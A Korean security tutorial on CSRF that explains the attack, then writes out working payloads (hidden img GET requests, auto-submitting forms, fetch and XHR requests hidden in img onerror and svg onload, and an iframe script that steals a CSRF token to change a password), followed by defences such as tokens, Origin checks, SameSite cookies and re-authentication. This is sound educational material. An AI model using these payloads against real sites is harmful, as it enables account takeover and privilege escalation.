CSRF 공격 기법과 방어

1. CSRF란?​

  • 정의: 피해자가 의도하지 않은 요청을 공격자가 대신 보내게 만드는 공격. 피해자의 인증된 세션을 이용
  • 핵심: XSS와 상관없이, 상대방한테 임의로 해당 기능을 작동하도록 요청을 날렸더니 별도의 검증 없이 그냥 실행된다면 CSRF

2. CSRF 공격 시나리오​

비밀번호 변경 예시:

GET /changePw?newPassword=1234 HTTP/1.1
Cookie: sessid=victim_session

공격 과정 5단계:

  1. 피해자가 서비스에 로그인하여 인증된 세션 쿠키 보유
  2. 공격자가 악성 링크/페이지를 준비 (<img>, <form>, 이메일 등)
  3. 피해자가 해당 링크에 접근 (클릭, 이메일 열람, 게시글 열람 등)
  4. 브라우저가 피해자의 세션 쿠키와 함께 공격자가 만든 요청을 자동 전송
  5. 서버는 피해자의 정상 요청으로 인식하고 처리 → 비밀번호 변경 완료

3. CSRF 공격 기법​

3.1 GET 방식 CSRF​

가장 단순한 형태. <img> 태그 등으로 자동 요청 유발:

<img src="https://target.com/api/change_role?user=attacker&role=admin" style="display:none">
  • 피해자가 페이지를 열기만 해도 요청 발생
  • 별도의 클릭 불필요

3.2 POST 방식 CSRF​

기본 form submit (비권장 - 페이지 이동으로 티가 남):

<form id="csrf_form" method="POST" action="https://target.com/api/update">
  <input type="hidden" name="target_id" value="attacker">
  <input type="hidden" name="new_role" value="ADMIN">
</form>
<script>document.getElementById('csrf_form').submit();</script>

AJAX 백그라운드 요청 (권장):

fetch('https://target.com/api/update', {
  method: 'POST',
  credentials: 'include',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: 'target_id=attacker&new_role=ADMIN'
});

3.3 은밀한 POST CSRF (실무 방식)​

XMLHttpRequest + img onerror:

<img src="x" onerror="var x=new XMLHttpRequest();x.open('POST','/api/update',true);x.setRequestHeader('Content-Type','application/x-www-form-urlencoded');x.send('target_id=attacker&new_role=ADMIN');" style="display:none;">

fetch API + img onerror:

<img src="x" onerror="fetch('/api/update',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'target_id=attacker&new_role=ADMIN'});" style="display:none;">

svg onload + fetch:

<svg onload="fetch('/api/update',{method:'POST',credentials:'include',body:new URLSearchParams({target_id:'attacker',new_role:'ADMIN'})})">

중요: 블로그에 흔히 나오는 form.submit() 방식은 페이지 이동이 발생하여 실무에서 거의 사용하지 않음. AJAX로 백그라운드 요청을 해야 피해자가 눈치채지 못하는 은밀한 공격 가능.

3.4 CSRF Token 우회 공격​

CSRF 토큰이 있어도 같은 도메인에서 XSS가 가능하면 우회 가능:

iframe으로 토큰 추출 → fetch로 공격 요청:

// 1. iframe으로 토큰이 포함된 페이지 로드
var iframe = document.createElement('iframe');
iframe.src = '/change_password_form';
document.body.appendChild(iframe);

iframe.onload = function() {
  // 2. iframe 내 토큰 추출
  var token = iframe.contentDocument.querySelector('input[name="csrf_token"]').value;

  // 3. 추출한 토큰으로 공격 요청 전송
  fetch('/api/change_password', {
    method: 'POST',
    credentials: 'include',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: 'new_password=hacked&csrf_token=' + token
  });
};

요청 방식별 공격 가능 여부:

요청 방식Sec-Fetch-Mode토큰 세션 저장공격 가능
iframenavigate저장됨성공
objectnavigate저장됨성공
fetchcors저장 안됨실패

4. CSRF 방어 기법​

4.1 하나마나한 대응방안 (비권장)​

대응 방안이유가 없는 이유
POST 방식 사용JS로 POST 요청 보내면 그만. 방어 효과 없음
XSS 막기CSRF와 XSS는 별개! CSRF는 XSS 없이도 링크/이메일로 가능

4.2 실효적인 대응방안​

CSRF 토큰​

서버에서 랜덤 토큰 생성 → 폼에 포함 → 요청 시 검증:

// 토큰 생성 (세션에 저장)
String csrfToken = UUID.randomUUID().toString();
session.setAttribute("csrf_token", csrfToken);

// 폼에 hidden 필드로 포함
// <input type="hidden" name="csrf_token" value="${csrfToken}">

// 요청 검증
String requestToken = request.getParameter("csrf_token");
String sessionToken = (String) session.getAttribute("csrf_token");

if (!requestToken.equals(sessionToken)) {
    response.sendError(403, "CSRF token mismatch");
    return;
}

Referer/Origin 헤더 검증​

String origin = request.getHeader("Origin");
String referer = request.getHeader("Referer");

if (origin != null && !origin.startsWith("https://target.com")) {
    response.sendError(403, "Invalid Origin");
    return;
}

문제점: VPN 사용 시 Referer가 이상하게 바뀌는 경우가 있어 정상 사용자가 차단될 수 있음. Origin 헤더 검증이 더 안정적.

SameSite 쿠키​

SameSite 값설명보안 수준
Strict외부 사이트에서의 모든 요청에 쿠키 미포함높음 (일부 UX 불편)
LaxGET 탐색 요청에는 쿠키 포함, POST 등은 미포함중간 (기본값)
None모든 Cross-site 요청에 쿠키 포함 (HTTPS + Secure 필요)낮음
Set-Cookie: sessid=abc123; SameSite=Strict; Secure; HttpOnly

재인증 요구​

중요 기능 수행 전 비밀번호/OTP 재확인:

비밀번호 변경, 권한 변경, 계좌이체 등 → 현재 비밀번호 또는 OTP 입력 요구

공격자가 요청을 보내더라도 재인증 단계에서 차단됨. 가장 강력한 방어 수단 중 하나.

CAPTCHA​

자동화된 요청 차단. 다만 가용성 문제(UX 저하)가 있어 민감한 기능에 선택적으로 적용 권장.

5. XSS vs CSRF 차이점 (면접 단골)​

잘못된 설명 (흔한 오해)​

"XSS는 클라이언트 공격, CSRF는 서버 공격" → 틀린 설명

두 공격 모두 서버와 클라이언트 모두에 영향을 미치므로 이 구분은 의미 없음.

올바른 설명​

구분XSSCSRF
공격 방식악성 스크립트를 삽입하여 피해자 브라우저에서 실행피해자의 세션을 이용해 의도치 않은 요청 전송
취약한 기능사용자 입력을 출력하는 게시판, 댓글, 프로필 등비밀번호 변경, 권한 변경, 결제 등 상태 변경 기능
필요 조건스크립트가 실행되는 취약한 입출력 지점검증 없이 실행되는 기능 (인증만 확인)
대응 위치출력 인코딩, CSP, 입력 검증CSRF 토큰, SameSite, 재인증

핵심 차이:

  • XSS: 게시판 등 스크립트 삽입 가능 지점이 취약 → 스크립트가 실행되어야 공격 성립
  • CSRF: 비밀번호 변경, 권한 변경 등 기능 자체가 취약 → 요청만 발생하면 공격 성립
  • CSRF 공격에 XSS가 필요한 것은 아님! (링크, 이메일, 악성 페이지만으로도 가능)

6. XSS vs CSRF vs SSRF 구분​

공격누구한테 시키나?무엇을 하나?
XSS피해자 브라우저에게악성 스크립트 실행 (세션 탈취, 피싱 등)
CSRF피해자 브라우저에게의도치 않은 요청 전송 (기능 남용)
SSRF서버에게서버가 내부/외부 URL로 요청 전송

간단 판별법:

  • 스크립트 실행 가능한 지점이 취약? → XSS
  • 기능이 검증 없이 실행? → CSRF
  • 서버가 내부 URL로 요청? → SSRF

트러블슈팅 체크리스트​

  • CSRF 토큰 검증이 모든 상태 변경 요청(POST, PUT, DELETE 등)에 적용되어 있는가?
  • SameSite 쿠키 설정이 되어 있는가? (Strict 또는 Lax 권장)
  • 중요 기능(비밀번호 변경, 권한 변경)에 재인증이 적용되어 있는가?
  • Referer/Origin 검증이 추가적으로 적용되어 있는가?
  • GET 방식으로 상태 변경 요청을 처리하고 있지 않은가?
